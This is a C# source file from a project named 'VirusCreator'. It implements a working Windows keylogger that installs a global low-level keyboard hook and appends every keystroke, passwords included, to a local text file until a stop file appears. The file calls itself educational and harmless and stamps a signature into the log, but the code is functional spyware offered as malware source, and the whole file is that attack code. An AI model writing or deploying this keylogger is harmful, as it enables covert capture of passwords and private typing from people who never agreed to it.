using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace VirusCreator
{
    public class Keylogger : IDisposable
    {
        private const string VIRUS_SIGNATURE = "EDU_VIRUS_SIGNATURE_2024_EDUCATIONAL_ONLY";
        private const string KEYLOG_FILE = "keylog.txt";
        private const string STOP_FILE = "stop_keylogger.txt";
        private string logFilePath;
        private string stopFilePath;
        private LowLevelKeyboardProc keyboardProc;
        private IntPtr hookId = IntPtr.Zero;
        private bool isRunning = false;
        private int keyCount = 0;

        // Windows API
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        public Keylogger(string folderPath)
        {
            logFilePath = Path.Combine(folderPath, KEYLOG_FILE);
            stopFilePath = Path.Combine(folderPath, STOP_FILE);
            keyboardProc = HookCallback;
        }

        public void Start()
        {
            if (isRunning) return;

            // Keylog dosyasına başlangıç bilgisi ve virüs imzası ekle
            string header = $"=== KEYLOGGER BAŞLADI - {DateTime.Now} ===\n";
            header += $"EĞİTİM AMAÇLI - ZARARSIZ\n";
            header += $"{VIRUS_SIGNATURE}\n";
            header += $"=== TUŞ KAYITLARI ===\n\n";
            
            File.AppendAllText(logFilePath, header);
            
            hookId = SetHook(keyboardProc);
            isRunning = true;
        }

        public void Stop()
        {
            if (!isRunning) return;

            UnhookWindowsHookEx(hookId);
            isRunning = false;

            // Keylog dosyasına bitiş bilgisi ekle
            string footer = $"\n\n=== KEYLOGGER DURDURULDU - {DateTime.Now} ===\n";
            File.AppendAllText(logFilePath, footer);
        }

        private IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
            {
                var curModule = curProcess.MainModule;
                if (curModule != null)
                {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                        GetModuleHandle(curModule.ModuleName), 0);
                }
            }
            return IntPtr.Zero;
        }

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            // Stop dosyası kontrolü (her tuşta kontrol et - hızlı tepki için)
            if (File.Exists(stopFilePath))
            {
                Stop();
                // Stop dosyasını sil
                try { File.Delete(stopFilePath); } catch { }
                return CallNextHookEx(hookId, nCode, wParam, lParam);
            }

            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                keyCount++;

                int vkCode = Marshal.ReadInt32(lParam);
                string key = ((Keys)vkCode).ToString();

                // Özel tuşları daha okunabilir yap
                string keyName = FormatKey(key);
                
                try
                {
                    File.AppendAllText(logFilePath, keyName);
                }
                catch { }

                // Enter tuşu için yeni satır
                if (vkCode == (int)Keys.Enter)
                {
                    try
                    {
                        File.AppendAllText(logFilePath, "\n");
                    }
                    catch { }
                }
            }

            return CallNextHookEx(hookId, nCode, wParam, lParam);
        }

        private string FormatKey(string key)
        {
            // Özel tuşları formatla
            switch (key)
            {
                case "Space": return " ";
                case "Return": return "\n";
                case "LShiftKey":
                case "RShiftKey":
                case "LControlKey":
                case "RControlKey":
                case "LMenu":
                case "RMenu": return "";
                case "Capital": return "[CAPS]";
                case "Tab": return "[TAB]";
                case "Back": return "[BACKSPACE]";
                case "Escape": return "[ESC]";
                default:
                    // Shift tuşu basılı mı kontrol et (basit versiyon)
                    if (key.Length == 1)
                        return key.ToLower();
                    return $"[{key}]";
            }
        }

        public bool IsRunning => isRunning;

        public void Dispose()
        {
            Stop();
        }
    }
}

